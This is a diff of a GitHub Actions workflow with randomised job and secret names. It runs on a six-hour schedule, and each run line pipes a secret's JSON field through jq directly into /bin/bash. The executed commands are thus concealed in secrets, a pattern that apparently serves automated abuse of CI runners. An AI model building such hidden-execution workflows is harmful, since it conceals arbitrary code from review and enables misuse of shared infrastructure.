@@ -2,30 +2,26 @@ name: durufei3456
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 4/6 * * *'
-
+    - cron: '5 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: durufei3456
         env:
-          cod90: ${{ secrets.cod90 }}
+          s6443: ${{ secrets.s6443 }}
         run: |
-          echo $cod90 | jq -r .ato06 | /bin/bash
-          echo $k66 | jq -r .zcjkh10375 | /bin/bash
-          echo $fhguj9 | jq -r .fzae97527 | /bin/bash
-          echo $ddcm02 | jq -r .d650 | /bin/bash
-          echo $aoj5 | jq -r .nz06441 | /bin/bash
-          echo $bmy229 | jq -r .i669 | /bin/bash
-          echo $ce01 | jq -r .p81 | /bin/bash
-          echo $a41415 | jq -r .gpxjs64 | /bin/bash
-          echo $loduv982 | jq -r .ltaii00937 | /bin/bash
-          echo $cmcwp687 | jq -r .bokui8105 | /bin/bash
-          echo $sxns64 | jq -r .ana57719 | /bin/bash
-          echo $tv43405 | jq -r .qzhz80291 | /bin/bash
-          echo $xk7637 | jq -r .txxxs6376 | /bin/bash
-          echo $lhdh8618 | jq -r .n63511 | /bin/bash
+          echo $s6443 | jq -r .tntcx423 | /bin/bash
+          echo $tqyp4560 | jq -r .modpf7614 | /bin/bash
+          echo $olzo5676 | jq -r .naton80 | /bin/bash
+          echo $lpuab3 | jq -r .kjt23 | /bin/bash
+          echo $m71946 | jq -r .rsmt82693 | /bin/bash
+          echo $eyrkx8165 | jq -r .wx42 | /bin/bash
+          echo $mtzny5 | jq -r .jvoh18 | /bin/bash
+          echo $cw45941 | jq -r .xmhpo13 | /bin/bash
+          echo $iwiq7 | jq -r .jde7838 | /bin/bash
+          echo $iz800 | jq -r .fqqn7988 | /bin/bash
+          echo $p046 | jq -r .toa25 | /bin/bash
+          echo $lwp76250 | jq -r .yaoj11555 | /bin/bash
 
